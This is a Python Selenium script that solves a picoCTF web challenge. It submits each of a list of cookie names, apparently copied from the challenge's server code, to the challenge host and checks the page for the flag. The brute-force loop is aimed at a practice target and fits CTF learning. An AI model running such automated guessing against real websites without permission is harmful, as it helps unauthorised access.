from selenium import webdriver
from selenium.webdriver.common.by import By 
from bs4 import BeautifulSoup

print('wait...')

service = webdriver.ChromeService(executable_path= r'/home/.../chromedriver') #path to your webdriver
driver = webdriver.Chrome(service = service)

# list taken from server.py
cookies = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

cookie_url = 'http://mercury.picoctf.net:44693/'
reset_url = 'http://mercury.picoctf.net:44693/reset'

# assuming correct cookie gives the flag
response_correct = 'picoCTF{'
response_incorrect = 'That is a cookie! Not very special though'

for ind, cookie in enumerate(cookies):
    driver.get(cookie_url)
    driver.find_element(By.NAME,'name').send_keys(cookie)
    driver.find_element(By.CSS_SELECTOR, "input[type=\"submit\"]").click()

    soup = BeautifulSoup(driver.page_source, 'lxml')
    for each in soup.find_all('div'):
    	if response_incorrect in each.text:
    		print(f'not {cookie}')
    		break
    	elif response_correct in each.text:
    		print(f'maybe {cookie}')
    		break
    	else:
    		print('something went wrong')
    driver.get(reset_url)
